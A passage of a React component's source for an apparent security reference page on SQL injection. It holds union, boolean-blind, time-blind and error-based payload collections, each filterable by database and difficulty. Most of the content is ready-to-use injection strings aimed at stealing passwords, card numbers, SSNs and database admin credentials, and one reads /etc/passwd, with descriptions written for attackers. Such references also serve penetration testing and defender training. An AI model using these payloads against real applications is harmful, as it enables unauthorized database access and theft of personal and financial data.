import React, { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import Sidebar from '../../components/navigation/Sidebar';
import Breadcrumb from '../../components/navigation/Breadcrumb';
import GlobalSearch from '../../components/navigation/GlobalSearch';
import VulnerabilityHeader from './components/VulnerabilityHeader';
import FilterControls from './components/FilterControls';
import PayloadCard from './components/PayloadCard';

const SQLInjectionVulnerabilityDetails = () => {
  const [isProMode, setIsProMode] = useState(false);
  const [activeSQLType, setActiveSQLType] = useState('union-based');
  const [filters, setFilters] = useState({
    database: 'All',
    complexity: 'All',
    technique: 'All'
  });
  const [filteredPayloads, setFilteredPayloads] = useState([]);

  const sqlTypes = {
    "union-based": {
      title: "Union-Based SQL Injection",
      explanation: "Union-based SQL injection exploits the UNION SQL operator to combine results from the original query with results from injected queries. This allows attackers to extract data from different database tables by appending a UNION SELECT statement to vulnerable SQL queries. It's one of the most powerful and commonly exploited SQL injection techniques because it provides direct data extraction capabilities and works when application displays query results on the page.",
      whereItAppears: [
        "Search functionality displaying results from database queries",
        "Product filtering and sorting mechanisms in e-commerce applications",
        "User profile pages fetching data from multiple tables",
        "Content management systems with database-driven content display",
        "Reporting dashboards showing aggregated database information",
        "API endpoints returning JSON/XML data from database queries"
      ],
      impact: "Union-based SQL injection enables complete database enumeration, allowing attackers to extract all data from any accessible table including usernames, passwords, credit card information, and sensitive business data. Attackers can determine database structure, table names, column names, and data types systematically. This technique bypasses application-level access controls entirely and can lead to complete data breach, intellectual property theft, regulatory compliance violations, and cascading attacks using stolen credentials. The direct data extraction makes it extremely dangerous for applications handling sensitive information.",
      realWorldScenarios: [
        {
          title: "E-commerce Product Search Exploitation",
          scenario: "An online store's product search allows SQL injection through the search parameter. Attacker uses UNION to extract customer payment information from the payment_methods table while searching for products.",
          payload: "' UNION SELECT card_number, card_cvv, expiry_date, customer_name FROM payment_methods--",
          impact: "Direct extraction of thousands of credit card details, leading to massive financial fraud and regulatory penalties under PCI-DSS."
        },
        {
          title: "User Authentication Bypass with Data Theft",
          scenario: "A login portal vulnerable to UNION injection not only allows authentication bypass but also enables extraction of all user credentials from the database.",
          payload: "admin' UNION SELECT username, password_hash, email, phone FROM users WHERE role='admin'--",
          impact: "Complete admin account takeover plus extraction of all user credentials for credential stuffing attacks across other platforms."
        },
        {
          title: "Corporate Intranet Database Enumeration",
          scenario: "An internal employee directory search is vulnerable. Attacker systematically enumerates entire database schema and extracts sensitive corporate data including salaries, projects, and trade secrets.",
          payload: "' UNION SELECT table_name, column_name, data_type, NULL FROM information_schema.columns--",
          impact: "Complete corporate data breach, exposure of confidential business intelligence, and potential industrial espionage."
        }
      ],
      payloads: [
        {
          name: "Basic UNION SELECT",
          code: "' UNION SELECT NULL, username, password FROM users--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Data Extraction",
          description: "Fundamental UNION injection to extract user credentials. Tests column count matching and retrieves sensitive authentication data.",
          difficulty: "beginner"
        },
        {
          name: "Column Count Determination",
          code: "' ORDER BY 5--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Reconnaissance",
          description: "Determines number of columns in original query using ORDER BY. Essential first step before UNION attack.",
          difficulty: "beginner"
        },
        {
          name: "NULL-based Column Matching",
          code: "' UNION SELECT NULL, NULL, NULL--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Reconnaissance",
          description: "Uses NULL values to match column count without type errors. Identifies correct number of columns for successful UNION.",
          difficulty: "beginner"
        },
        {
          name: "Data Type Discovery",
          code: "' UNION SELECT 'text', 123, NULL--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Reconnaissance",
          description: "Tests data types of each column to avoid type mismatch errors. Critical for crafting precise UNION queries.",
          difficulty: "intermediate"
        },
        {
          name: "Database Version Extraction",
          code: "' UNION SELECT NULL, @@version, NULL--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Fingerprinting",
          description: "Retrieves database version information. Helps attacker identify database-specific exploitation techniques.",
          difficulty: "beginner"
        },
        {
          name: "Current Database Name",
          code: "' UNION SELECT NULL, database(), NULL--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Reconnaissance",
          description: "Extracts current database name being queried. Essential for targeting specific tables in multi-database environments.",
          difficulty: "beginner"
        },
        {
          name: "Table Enumeration",
          code: "' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Schema Discovery",
          description: "Lists all tables in current database using information_schema. Reveals database structure for further exploitation.",
          difficulty: "intermediate"
        },
        {
          name: "Column Enumeration",
          code: "' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Schema Discovery",
          description: "Enumerates column names for specific table. Identifies which columns contain valuable data like passwords or credit cards.",
          difficulty: "intermediate"
        },
        {
          name: "Multi-Column Concatenation",
          code: "' UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Combines multiple columns into single output field using CONCAT. Extracts related data when column count is limited.",
          difficulty: "intermediate"
        },
        {
          name: "String Delimiter Concatenation",
          code: "' UNION SELECT NULL, GROUP_CONCAT(username, ':', password SEPARATOR ';'), NULL FROM users--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Aggregates all rows into single delimited string. Extracts entire table contents in one query result.",
          difficulty: "intermediate"
        },
        {
          name: "PostgreSQL System Catalog",
          code: "' UNION SELECT NULL, tablename, NULL FROM pg_tables WHERE schemaname='public'--",
          database: "PostgreSQL",
          complexity: "Advanced",
          technique: "Schema Discovery",
          description: "PostgreSQL-specific table enumeration using system catalogs. Targets PostgreSQL databases with different metadata structure.",
          difficulty: "advanced"
        },
        {
          name: "SQL Server Information Schema",
          code: "' UNION SELECT NULL, name, NULL FROM sys.tables--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Schema Discovery",
          description: "SQL Server system table enumeration. Uses MSSQL-specific sys schema for database reconnaissance.",
          difficulty: "advanced"
        },
        {
          name: "Oracle Database Links",
          code: "' UNION SELECT NULL, table_name, NULL FROM all_tables--",
          database: "Oracle",
          complexity: "Advanced",
          technique: "Schema Discovery",
          description: "Oracle database table enumeration via all_tables view. Exploits Oracle-specific metadata structures.",
          difficulty: "advanced"
        },
        {
          name: "File Read via LOAD_FILE",
          code: "' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "File Access",
          description: "Reads local server files using MySQL LOAD_FILE function. Can access configuration files, source code, and credentials.",
          difficulty: "advanced"
        },
        {
          name: "Subquery-based Extraction",
          code: "' UNION SELECT NULL, (SELECT password FROM users WHERE username='admin'), NULL--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Uses subquery to target specific record. Precise extraction when full table dump isn't feasible.",
          difficulty: "advanced"
        },
        {
          name: "Cross-Database UNION",
          code: "' UNION SELECT NULL, username, password FROM mysql.user--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Privilege Escalation",
          description: "Accesses system database (mysql.user) to extract database administrator credentials. Enables complete database takeover.",
          difficulty: "advanced"
        },
        {
          name: "Conditional UNION Extraction",
          code: "' UNION SELECT NULL, IF(LENGTH(password)>5, password, 'short'), NULL FROM users WHERE username='admin'--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Uses conditional logic in UNION to filter or validate extracted data before retrieval.",
          difficulty: "advanced"
        },
        {
          name: "Hex-encoded String Injection",
          code: "' UNION SELECT NULL, 0x61646d696e, NULL-- (hex for 'admin')",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Evasion",
          description: "Bypasses string filters using hex encoding. Useful when quotes are filtered but hex literals are allowed.",
          difficulty: "advanced"
        },
        {
          name: "Time-delayed UNION",
          code: "' UNION SELECT NULL, SLEEP(5), NULL--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Blind Testing",
          description: "Combines UNION with time delay for blind verification. Confirms vulnerability when output isn't visible.",
          difficulty: "advanced"
        },
        {
          name: "Multi-Table JOIN Extraction",
          code: "' UNION SELECT NULL, u.username, p.card_number FROM users u JOIN payments p ON u.id=p.user_id--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Joins multiple tables in UNION query to correlate data across database. Extracts complex relational data in single query.",
          difficulty: "advanced"
        }
      ]
    },
    "boolean-based": {
      title: "Boolean-Based Blind SQL Injection",
      explanation: "Boolean-based blind SQL injection exploits applications that respond differently to true and false SQL conditions, even when no actual data is returned in the response. Attackers inject conditional statements and observe changes in application behavior (page content, error messages, response timing) to infer whether injected conditions are true or false. This technique works by asking yes/no questions to the database one bit at a time, allowing complete data extraction without seeing direct query results. It's particularly effective against applications that sanitize output but still reflect query success/failure in observable ways.",
      whereItAppears: [
        "Login forms that show different messages for valid vs invalid credentials",
        "Search functionality with 'no results found' vs results displayed behaviors",
        "Product filters that alter page layout based on filter query results",
        "User profile lookups that show 'user not found' vs profile information",
        "API endpoints returning different HTTP status codes based on query results",
        "Admin panels with permission checks displaying different content"
      ],
      impact: "Boolean-based blind SQL injection enables complete data extraction through binary search techniques, allowing attackers to reconstruct entire databases character by character despite no direct data display. While slower than UNION-based attacks, it's highly effective against applications with strict output sanitization. Attackers can extract passwords, credit cards, and sensitive business data by repeatedly testing conditions. The technique bypasses many security measures because it doesn't rely on error messages or data display, only on observable differences in application behavior. It's particularly dangerous because it works even when developers believe they've prevented SQL injection through output filtering.",
      realWorldScenarios: [
        {
          title: "Login Authentication Bypass and Password Extraction",
          scenario: "A banking application login shows \'Invalid credentials\' for wrong passwords but \'Account locked\' when username is correct but password is wrong. Attacker uses boolean injection to extract password hash character by character.",
          payload: "admin' AND SUBSTRING(password, 1, 1) = 'a'--",
          impact: "Complete password hash extraction leading to offline cracking and unauthorized access to financial accounts. Binary search reduces extraction time from hours to minutes."
        },
        {
          title: "Healthcare Records Enumeration",
          scenario: "Hospital patient lookup system shows different page layouts when patient exists vs doesn't exist. Attacker uses boolean conditions to extract Social Security numbers and medical records without direct data display.",
          payload: "' AND (SELECT COUNT(*) FROM patients WHERE ssn LIKE '123%') > 0--",
          impact: "HIPAA violation through systematic extraction of protected health information. Enables identity theft and medical fraud despite no visible data in responses."
        },
        {
          title: "E-commerce Inventory Price Discovery",
          scenario: "Online store\'s price filter functionality uses SQL queries with boolean conditions. Competitor uses blind injection to extract wholesale pricing and profit margins from database without viewing actual product pages.",
          payload: "' AND (SELECT wholesale_price FROM products WHERE id=1) > 50--",
          impact: "Corporate espionage exposing sensitive pricing strategies. Competitive disadvantage through systematic price intelligence gathering using binary search on price values."
        }
      ],
      payloads: [
        {
          name: "Basic True Condition Test",
          code: "' AND 1=1--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Tests if injection point exists by injecting always-true condition. If page behaves normally, injection is confirmed.",
          difficulty: "beginner"
        },
        {
          name: "Basic False Condition Test",
          code: "' AND 1=2--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Tests injection with always-false condition. Different behavior from true condition confirms boolean-based blind SQLi.",
          difficulty: "beginner"
        },
        {
          name: "Database Version Boolean Check",
          code: "' AND (SELECT @@version) LIKE '5%'--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Fingerprinting",
          description: "Determines database version through boolean condition. True response indicates MySQL version 5.x.",
          difficulty: "beginner"
        },
        {
          name: "Table Existence Check",
          code: "' AND (SELECT COUNT(*) FROM users) > 0--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Reconnaissance",
          description: "Verifies if specific table exists in database. True condition means 'users' table exists.",
          difficulty: "beginner"
        },
        {
          name: "Record Count Enumeration",
          code: "' AND (SELECT COUNT(*) FROM users) > 100--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Reconnaissance",
          description: "Determines approximate number of records using binary search. Narrows down exact count through repeated tests.",
          difficulty: "intermediate"
        },
        {
          name: "Character-by-Character Extraction",
          code: "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Extracts password first character. Repeat with position 2, 3... to reconstruct entire password.",
          difficulty: "intermediate"
        },
        {
          name: "ASCII Value Comparison",
          code: "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) > 65--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Uses ASCII values for faster binary search extraction. More efficient than testing each character individually.",
          difficulty: "intermediate"
        },
        {
          name: "String Length Determination",
          code: "' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 32--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Determines exact length of target string before extraction. Optimizes subsequent character-by-character extraction.",
          difficulty: "intermediate"
        },
        {
          name: "Column Existence Boolean",
          code: "' AND (SELECT credit_card FROM users WHERE id=1) IS NOT NULL--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Schema Discovery",
          description: "Tests if specific column exists and contains data. Identifies sensitive fields for targeted extraction.",
          difficulty: "intermediate"
        },
        {
          name: "Conditional Regex Matching",
          code: "' AND (SELECT email FROM users WHERE id=1) REGEXP '^admin@'--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Uses regex patterns for bulk extraction. Faster than character-by-character for known patterns like emails.",
          difficulty: "intermediate"
        },
        {
          name: "PostgreSQL Boolean Casting",
          code: "' AND (SELECT password FROM users WHERE username='admin')::text LIKE 'a%'--",
          database: "PostgreSQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "PostgreSQL-specific type casting for boolean comparisons. Uses LIKE for pattern-based extraction.",
          difficulty: "advanced"
        },
        {
          name: "SQL Server Case-When Boolean",
          code: "' AND (CASE WHEN (SELECT COUNT(*) FROM users) > 10 THEN 1 ELSE 0 END) = 1--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "SQL Server conditional logic for boolean extraction. CASE statement creates explicit true/false conditions.",
          difficulty: "advanced"
        },
        {
          name: "Oracle Boolean with DECODE",
          code: "' AND DECODE(SUBSTR((SELECT password FROM users WHERE ROWNUM=1), 1, 1), 'a', 1, 0) = 1--",
          database: "Oracle",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Oracle-specific DECODE function for character comparison. Extracts data through conditional evaluation.",
          difficulty: "advanced"
        },
        {
          name: "Bitwise AND Boolean",
          code: "' AND (SELECT COUNT(*) FROM users WHERE (id & 1) = 1) > 0--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Uses bitwise operations for numeric data extraction. Efficient for extracting integer values bit by bit.",
          difficulty: "advanced"
        },
        {
          name: "Nested Boolean Subquery",
          code: "' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Nested subquery with EXISTS for boolean testing. More reliable than direct comparisons in some databases.",
          difficulty: "advanced"
        },
        {
          name: "Time-based Boolean Hybrid",
          code: "' AND IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Blind Testing",
          description: "Combines boolean logic with time delays for enhanced reliability. Confirms conditions through timing side-channel.",
          difficulty: "advanced"
        },
        {
          name: "Boolean Error Suppression",
          code: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END) = 1--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Evasion",
          description: "Uses division-by-zero as boolean signal while suppressing errors. Differentiates true/false through error vs success.",
          difficulty: "advanced"
        },
        {
          name: "Bulk Boolean Enumeration",
          code: "' AND (SELECT COUNT(*) FROM users WHERE username BETWEEN 'a' AND 'm') > 0--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Range-based boolean testing for faster bulk enumeration. Reduces extraction queries through alphabetical ranges.",
          difficulty: "advanced"
        },
        {
          name: "Hash Comparison Boolean",
          code: "' AND MD5((SELECT password FROM users WHERE id=1)) = 'expected_hash'--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Compares password hashes directly for validation. Useful when password is hashed and rainbow tables are available.",
          difficulty: "advanced"
        },
        {
          name: "Multi-Table Boolean Correlation",
          code: "' AND EXISTS(SELECT 1 FROM users u JOIN orders o ON u.id=o.user_id WHERE u.username='admin' AND o.total > 1000)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Correlates data across tables using boolean EXISTS. Extracts relational information through join conditions.",
          difficulty: "advanced"
        }
      ]
    },
    "time-based": {
      title: "Time-Based Blind SQL Injection",
      explanation: "Time-based blind SQL injection exploits the database's ability to delay query execution based on injected conditions. Attackers inject payloads containing time-delay functions (like SLEEP, WAITFOR, pg_sleep) that pause database execution for a specified duration only when certain conditions are met. By measuring response times, attackers infer whether injected conditions are true (delayed response) or false (normal response). This technique is the most covert form of SQL injection, working even when the application shows no visible changes between true and false conditions, no error messages, and identical page content regardless of query results. It's the last resort when other blind techniques fail.",
      whereItAppears: [
        "Heavily sanitized applications where all output is filtered but timing isn\'t controlled",
        "API endpoints that always return same status code and response structure",
        "Background processing systems that don't show query results to users",
        "Logging systems where injection doesn't affect visible output",
        "Monitoring dashboards that update asynchronously without user feedback",
        "Authentication mechanisms that intentionally hide timing differences (but fail to prevent injection)"
      ],
      impact: "Time-based blind SQL injection enables complete data exfiltration in applications considered immune to SQL injection due to strict output filtering. While slowest of all techniques (requiring one HTTP request per bit of information), it's unstoppable once identified because timing side-channels are nearly impossible to eliminate without breaking functionality. Attackers can extract passwords, credit cards, encryption keys, and source code by systematically testing conditions and measuring delays. The technique bypasses WAFs, parameterized queries with improper escaping, and all output sanitization. It's particularly dangerous in high-security environments because defenders often miss timing-based attacks in logs, making it ideal for low-and-slow APT-style data exfiltration.",
      realWorldScenarios: [
        {
          title: "Government Database Time-based Exfiltration",
          scenario: "A classified government system uses strict output filtering and always returns generic 'Query processed' messages. Attacker uses time-based injection to extract classified documents by testing character values and measuring response delays.",
          payload: "' AND IF(SUBSTRING((SELECT classified_doc FROM documents WHERE id=1), 1, 1) = 'T', SLEEP(5), 0)--",
          impact: "Systematic extraction of classified information over weeks/months without triggering security alerts. Nearly undetectable data breach of national security information."
        },
        {
          title: "Banking PIN Code Extraction via Timing",
          scenario: "ATM authentication system validates PINs server-side but returns identical error messages for all failures. Attacker uses time-based blind injection to extract encrypted PIN storage and subsequently decrypt customer PINs.",
          payload: "' AND IF((SELECT encrypted_pin FROM cards WHERE card_number='1234567890123456') LIKE '5%', BENCHMARK(10000000, MD5('a')), 0)--",
          impact: "Compromise of customer ATM PINs leading to unauthorized cash withdrawals. Timing-based attack evades all traditional fraud detection systems."
        },
        {
          title: "Corporate Email System Password Enumeration",
          scenario: "Enterprise email portal has perfect input validation but time-based injection exists in LDAP backend query. Attacker extracts administrator password hashes through systematic timing analysis.",
          payload: "' AND IF(ASCII(SUBSTRING((SELECT password_hash FROM ldap_users WHERE username='admin'), 1, 1)) > 77, SLEEP(3), 0)--",
          impact: "Complete domain takeover through extracted admin credentials. Persistent backdoor access to corporate network via compromised email administrator account."
        }
      ],
      payloads: [
        {
          name: "Basic Sleep Test",
          code: "' AND SLEEP(5)--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Causes 5-second delay if injection works. Delayed response confirms time-based blind SQL injection vulnerability.",
          difficulty: "beginner"
        },
        {
          name: "Conditional Sleep",
          code: "' AND IF(1=1, SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Tests conditional time delay. Delay only occurs when condition is true, confirming boolean logic works.",
          difficulty: "beginner"
        },
        {
          name: "False Condition No Delay",
          code: "' AND IF(1=2, SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Verifies time-based control by testing false condition. No delay confirms attacker controls timing behavior.",
          difficulty: "beginner"
        },
        {
          name: "Database Version Time-based",
          code: "' AND IF((SELECT @@version) LIKE '5%', SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Fingerprinting",
          description: "Determines database version through timing. 5-second delay indicates MySQL version 5.x.",
          difficulty: "beginner"
        },
        {
          name: "Table Existence Time Test",
          code: "' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Reconnaissance",
          description: "Checks table existence via timing side-channel. Delay confirms \'users\' table exists in database.",
          difficulty: "intermediate"
        },
        {
          name: "Character Extraction with Timing",
          code: "' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Extracts password character-by-character via timing. 5-second delay means first character is \'a\'.",
          difficulty: "intermediate"
        },
        {
          name: "ASCII Binary Search Timing",
          code: "' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) > 77, SLEEP(3), 0)--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Binary search optimization using ASCII comparison. Reduces extraction time from 256 to ~8 tests per character.",
          difficulty: "intermediate"
        },
        {
          name: "String Length via Timing",
          code: "' AND IF(LENGTH((SELECT password FROM users WHERE username='admin')) > 10, SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Determines string length through timing. Binary search finds exact length before character extraction.",
          difficulty: "intermediate"
        },
        {
          name: "Benchmark Heavy Computation",
          code: "' AND IF(1=1, BENCHMARK(10000000, MD5('a')), 0)--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Verification",
          description: "Alternative to SLEEP using CPU-intensive operation. Causes measurable delay through repeated MD5 hashing.",
          difficulty: "intermediate"
        },
        {
          name: "PostgreSQL pg_sleep",
          code: "'; SELECT CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) ELSE pg_sleep(0) END--",
          database: "PostgreSQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "PostgreSQL time-based extraction using pg_sleep function. Tests if current database user is 'postgres'.",
          difficulty: "advanced"
        },
        {
          name: "SQL Server WAITFOR",
          code: "'; IF (SELECT COUNT(*) FROM users) > 10 WAITFOR DELAY '00:00:05'--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "SQL Server time delay using WAITFOR DELAY. Standard time-based technique for MSSQL databases.",
          difficulty: "advanced"
        },
        {
          name: "Oracle DBMS_LOCK",
          code: "' AND (SELECT CASE WHEN COUNT(*) > 0 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM users)--",
          database: "Oracle",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Oracle database time-based injection via DBMS_LOCK.SLEEP. Requires specific Oracle permissions.",
          difficulty: "advanced"
        },
        {
          name: "Heavy Query Time Delay",
          code: "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) > 0--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Evasion",
          description: "Cartesian product causes massive computational delay. Alternative when SLEEP is blocked or monitored.",
          difficulty: "advanced"
        },
        {
          name: "Nested Time-based Subquery",
          code: "' AND IF((SELECT IF(SUBSTRING(password, 1, 1)='a', SLEEP(3), 0) FROM users WHERE id=1), 1, 0)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Nested conditional for complex extraction. Multiple IF statements create precise timing conditions.",
          difficulty: "advanced"
        },
        {
          name: "Multi-Character Range Timing",
          code: "' AND IF((SELECT COUNT(*) FROM users WHERE username BETWEEN 'a' AND 'm') > 0, SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Tests character ranges for faster extraction. Reduces search space through alphabetical range bisection.",
          difficulty: "advanced"
        },
        {
          name: "Stacked Query Time-based",
          code: "'; IF (1=1) WAITFOR DELAY '00:00:05';--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Verification",
          description: "SQL Server stacked query with time delay. Separates injection from original query entirely.",
          difficulty: "advanced"
        },
        {
          name: "Exponential Backoff Timing",
          code: "' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = 65, SLEEP(10), IF(..., SLEEP(5), SLEEP(2)))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Variable delay times for multi-condition testing. Different delays encode multiple bits of information.",
          difficulty: "advanced"
        },
        {
          name: "Time-based Error Suppression",
          code: "' AND IF((SELECT 1/0 FROM users WHERE username='admin'), SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Evasion",
          description: "Combines error-based and time-based techniques. Suppresses errors while using timing as information channel.",
          difficulty: "advanced"
        },
        {
          name: "Gradient Timing Attack",
          code: "' AND BENCHMARK(10000 * ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)), MD5('a'))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Variable computation time based on character value. Timing gradient reveals character without binary search.",
          difficulty: "advanced"
        },
        {
          name: "Concurrent Query Timing",
          code: "' AND IF((SELECT COUNT(*) FROM users u1, users u2, users u3) > 1000, SLEEP(5), 0)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Cartesian product with conditional delay. Amplifies timing signal through computational complexity.",
          difficulty: "advanced"
        }
      ]
    },
    "error-based": {
      title: "Error-Based SQL Injection",
      explanation: "Error-based SQL injection exploits verbose error messages returned by the database when queries fail. Attackers deliberately craft malicious SQL that triggers database errors, and then extract sensitive information from the error messages themselves. Modern databases often include portions of the failed query, table names, column names, or even data values in error outputs. This technique is particularly powerful because it provides immediate feedback without requiring multiple requests like blind techniques. It works by forcing the database to perform invalid operations (type conversion errors, division by zero, constraint violations) that generate descriptive error messages containing the information the attacker wants to extract.",
      whereItAppears: [
        "Development and staging environments with verbose error messages enabled",
        "Legacy applications built before secure coding practices were standard",
        "Custom-built applications without proper error handling middleware",
        "Database administration tools and web-based management interfaces",
        "API endpoints that return detailed error messages in JSON/XML responses",
        "Reporting systems that display SQL error details to help users debug queries"
      ],
      impact: "Error-based SQL injection enables rapid data extraction and complete database enumeration in a fraction of the time required for blind techniques. A single error message can reveal database structure, table names, column names, and actual data values. Attackers can extract entire databases in minutes by forcing errors that include query results in error text. The technique bypasses many defensive measures because applications often fail to sanitize error messages even when they sanitize normal output. It's particularly devastating in production environments that accidentally enable verbose error reporting, leading to immediate and complete data breaches. Error-based injection also reveals database version, configuration details, and file paths, providing attackers with reconnaissance information for further attacks.",
      realWorldScenarios: [
        {
          title: "Healthcare Portal Mass Data Breach",
          scenario: "Hospital patient portal returns detailed MySQL error messages to users. Attacker uses EXTRACTVALUE XML error to extract patient Social Security numbers, medical records, and insurance information in error messages.",
          payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(ssn, ':', diagnosis) FROM patient_records WHERE id=1)))--",
          impact: "HIPAA violation affecting 50,000+ patients. Complete medical history and SSN extraction via error messages. Regulatory fines and class-action lawsuit."
        },
        {
          title: "E-commerce Credit Card Exposure",
          scenario: "Online store\'s checkout system includes SQL errors in JSON API responses. Attacker uses type conversion errors to extract credit card numbers and CVVs from error messages.",
          payload: "' AND 1=CONVERT(INT, (SELECT TOP 1 CONCAT(card_number, ':', cvv, ':', expiry) FROM payment_methods))--",
          impact: "PCI-DSS violation with 10,000+ credit cards exposed through systematic error-based extraction. Immediate card fraud and regulatory sanctions."
        },
        {
          title: "Corporate Database Schema Disclosure",
          scenario: "Company intranet application displays SQL Server error messages to employees. Attacker uses error-based injection to extract complete database schema, revealing sensitive table structures including 'executive_compensation' and 'trade_secrets'.",
          payload: "' AND 1=CONVERT(INT, (SELECT table_name FROM information_schema.tables WHERE table_schema='corporate' FOR XML PATH))--",
          impact: "Complete corporate database structure exposed. Enables targeted attacks on high-value tables. Insider trading risk from exposed financial projections."
        }
      ],
      payloads: [
        {
          name: "Basic Type Conversion Error",
          code: "' AND 1=CONVERT(INT, (SELECT @@version))--",
          database: "MSSQL",
          complexity: "Beginner",
          technique: "Fingerprinting",
          description: "Forces type conversion error that includes database version in error message. Classic error-based technique for MSSQL.",
          difficulty: "beginner"
        },
        {
          name: "CAST Error Extraction",
          code: "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Data Extraction",
          description: "Attempts to cast string to integer, forcing error that reveals username in error text.",
          difficulty: "beginner"
        },
        {
          name: "Division by Zero Error",
          code: "' AND 1/0--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Simple division by zero to trigger error. Confirms injection point and error message visibility.",
          difficulty: "beginner"
        },
        {
          name: "EXTRACTVALUE XML Error",
          code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "MySQL EXTRACTVALUE function with invalid XPATH causes error revealing database name. Highly effective for data extraction.",
          difficulty: "intermediate"
        },
        {
          name: "UPDATEXML Error-based",
          code: "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Alternative to EXTRACTVALUE using UPDATEXML. Error message includes current database user.",
          difficulty: "intermediate"
        },
        {
          name: "JSON Error Extraction",
